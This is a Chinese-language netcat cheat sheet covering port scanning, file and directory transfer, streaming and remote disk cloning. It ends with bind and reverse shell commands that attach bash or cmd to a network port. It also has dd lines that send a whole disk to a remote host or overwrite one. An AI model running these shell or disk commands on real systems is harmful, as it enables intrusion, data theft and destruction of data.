## NetCat 工具

### NC 基本选项 v 和 n
```
ip 为 pop3.126.com 的ip pop3端口为110
nc -vn 220.181.15.128 110
```

nc 通过pop3进行登录


### NC 传输文本信息

```
A: nc -l -p 4444 // 监听端口
B: nc -nv 1.1.1.1 4444 // 客户请求端口
```


### NC 远端输入 输出

服务端通过
```
nc -l -p 24555 监听端口
```

客户端执行
```
$ ls -l | ./nc -nv 9.134.148.200 24555 -q 1 // 意思是连接1秒后关闭
```


将命令信息写入指定文件

```
nc -l =p 24555 > command.txt
```

### NC 传输文件/目录

传输文件

接受数据写入文件
```
nc -lp 34455 > test.py
```

客户端传输数据

```
nc -nv 9.134.148.200 34455 < test.py -q 1
```

或者 侦听反向传输数据

服务端监听传输
```
nc -lp 34455 < nmap-ncat-6.40-19.el7.x86_64.rpm
```

客户端连接接收

```
nc -nv 9.134.148.200 34455 > nmap.rpm
```

服务端传输目录数据

需要 - 指定打包的文件名
```
tar -cvf - testnc/ | nc -lp 33333
```

客户端接收指定目录数据 并解包
```
ncat -nv 9.134.148.200 33333 | tar -xvf -
```

加密传输文件

```
nc -lp 33333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > test.py
```

解密接收
```
mcrypt --flush -Fbq -a rijndael-256 -m ecb < test.py |nc -nv  9.134.148.200 33333
```

### NC 做流媒体服务器

读取流媒体到流端口
```
cat ttt.flv | nc -lp 33333
```

客户端解析并执行
```
ncat -nv 9.134.148.200 33333| ./vlc
```

### NC 端口扫描

扫描指定端口
```
nc -nvz 9.134.148.200 8000
```

```
nc -vnzu 9.134.148.200 -1024
```

### NC 远程克隆硬盘

将硬盘进行克隆 电子取证 可以将目标服务器硬盘远程复制, 或者内存
```
nc -l 333 | dd of=/dev/sda
dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1
```

### NC 远程控制

正向 先开启服务端 再开启客户端
```
nc -lp 33333 -c bash
ncat.exe -nv 9.134.148.200 33333
```

反向控制

```
nc -lp 33333
ncat.exe 9.134.148.200 33333 -c cmd
```